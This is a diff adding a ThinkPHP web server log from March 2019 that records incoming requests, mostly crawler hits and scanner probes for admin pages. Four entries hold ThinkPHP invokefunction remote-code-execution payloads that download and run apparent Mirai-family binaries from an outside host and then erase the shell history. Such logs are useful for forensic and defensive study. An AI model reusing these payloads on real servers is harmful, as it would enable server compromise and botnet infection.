@@ -1,0 +1,84 @@
+[ 2019-03-06T03:53:38+08:00 ] 157.230.189.162 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://68.183.97.243/shiro.x86;cat%20shiro.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20thinkphp;%20rm%20rf%20Mira01%20shiro.x86;%20history%20-c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
+ERR: 无法加载模块:Index
+
+[ 2019-03-06T03:53:39+08:00 ] 157.230.189.162 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;curl%20-O%20http://68.183.97.243/shiro.x86;cat%20shiro.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20thinkphp;%20rm%20rf%20Mira01%20shiro.x86;%20history%20-c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
+ERR: 无法加载模块:Index
+
+[ 2019-03-06T04:27:42+08:00 ] 220.181.108.177 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-03-06T04:27:42+08:00 ] 220.181.108.76 /uploads/151221/1-151221042Q0V4-lp.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
+ERR: 无法加载模块:Uploads
+
+[ 2019-03-06T05:11:00+08:00 ] 198.167.223.52 /acadmin.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000094s ]
+ERR: 无法加载模块:Acadmin
+
+[ 2019-03-06T06:07:49+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
+ERR: 无法加载模块:Cache
+
+[ 2019-03-06T10:03:17+08:00 ] 157.230.189.162 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://68.183.97.243/miori.x86;cat%20miori.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20thinkphp;%20rm%20rf%20Mira01%20miori.x86;%20history%20-c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
+ERR: 无法加载模块:Index
+
+[ 2019-03-06T10:03:17+08:00 ] 157.230.189.162 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;curl%20-O%20http://68.183.97.243/miori.x86;cat%20miori.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20thinkphp;%20rm%20rf%20Mira01%20miori.x86;%20history%20-c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
+ERR: 无法加载模块:Index
+
+[ 2019-03-06T10:12:19+08:00 ] 218.30.103.18 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-03-06T12:12:02+08:00 ] 111.202.101.128 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-03-06T15:12:51+08:00 ] 122.228.19.80 /mahua/v/20190212/8dfcb2192a5052e5a152b9d8115201af_24f3fa0cbc00474fab1610181191b09c_0.m3u8
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000138s ]
+ERR: 无法加载模块:Mahua
+
+[ 2019-03-06T16:16:14+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
+ERR: 无法加载模块:Cache
+
+[ 2019-03-06T16:40:06+08:00 ] 101.251.111.79 /phpmyadmin/index.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
+ERR: 无法加载模块:Phpmyadmin
+
+[ 2019-03-06T21:57:36+08:00 ] 59.36.119.226 /acadmin.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
+ERR: 无法加载模块:Acadmin
+
